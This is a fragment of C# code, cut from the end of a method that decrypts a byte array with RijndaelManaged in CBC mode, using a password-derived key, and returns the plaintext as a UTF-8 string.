                byte[] keyBytes = password.GetBytes(keysize / 8);
                using (RijndaelManaged symmetricKey = new RijndaelManaged())
                {
                    symmetricKey.Mode = CipherMode.CBC;
                    using (ICryptoTransform decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes))
                    {
                        using (MemoryStream memoryStream = new MemoryStream(cipherTextBytes))
                        {
                            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                            {
                                byte[] plainTextBytes = new byte[cipherTextBytes.Length];
                                int decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
                                return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount);
                            }
                        }
                    }
                }
            }
        }
    

}
}
